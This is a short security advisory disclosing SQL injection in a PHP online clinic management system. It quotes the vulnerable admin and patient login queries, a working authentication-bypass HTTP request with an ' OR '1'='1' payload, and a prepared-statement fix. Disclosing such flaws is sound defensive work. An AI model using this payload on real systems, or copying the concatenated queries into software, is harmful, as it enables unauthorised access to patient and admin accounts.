# SQL Injection — Online Clinic Management System

**Repository:** https://github.com/subhajitkhan/online-clinic-management-system  
**GitHub Issue:** https://github.com/subhajitkhan/online-clinic-management-system/issues/1  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89  
**CVE:** Pending  
**Discovered:** 2026-06-19

## Vulnerable Code

### `adminlogin.php`
```php
$mail = $_POST['adminmail'];
$pswd = $_POST['adminpswd'];
$sql = "SELECT * FROM admin_registration WHERE mail_id='$mail' AND password = '$pswd'";
```

### `patientlogin.php`
```php
$pat_mail = $_POST['pat_mail'];
$pat_pswd = $_POST['pat_pswd'];
$sql = "SELECT * FROM pat_registration WHERE pat_mail='$pat_mail' AND pat_pswd = '$pat_pswd'";
```

## Proof of Concept — Authentication Bypass

```http
POST /adminlogin.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

adminmail=x&adminpswd=' OR '1'='1' -- -
```

SQL becomes:
```sql
SELECT * FROM admin_registration WHERE mail_id='x' AND password='' OR '1'='1' -- -'
```

**Result:** Full admin access without credentials.

## Fix
```php
$stmt = $connection->prepare("SELECT * FROM admin_registration WHERE mail_id=? AND password=?");
$stmt->bind_param("ss", $_POST['adminmail'], $_POST['adminpswd']);
$stmt->execute();
```
